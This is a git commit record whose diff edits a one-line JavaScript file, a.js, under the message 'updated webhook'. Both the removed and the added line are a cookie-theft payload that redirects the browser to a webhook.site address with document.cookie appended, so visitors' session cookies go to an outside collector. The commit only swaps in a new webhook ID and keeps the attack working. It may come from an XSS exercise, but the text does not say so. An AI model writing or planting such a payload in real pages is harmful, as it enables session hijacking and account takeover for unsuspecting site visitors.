44b9d163ccf15aa310dc97968b4a03899dd0c196
HerLove12 <95884923+HerLove12@users.noreply.github.com>
2024-04-16 09:17:38 +0200

    updated webhook

--- a.js
+++ a.js
@@ -1,1 +1,1 @@
-window.location="https://webhook.site/9012e663-c461-4e07-a086-c86fdd16bbde?x=".concat(document.cookie);
+window.location="https://webhook.site/5df1f5a8-699b-4dd1-8d10-3a94995e63e2?x=".concat(document.cookie);
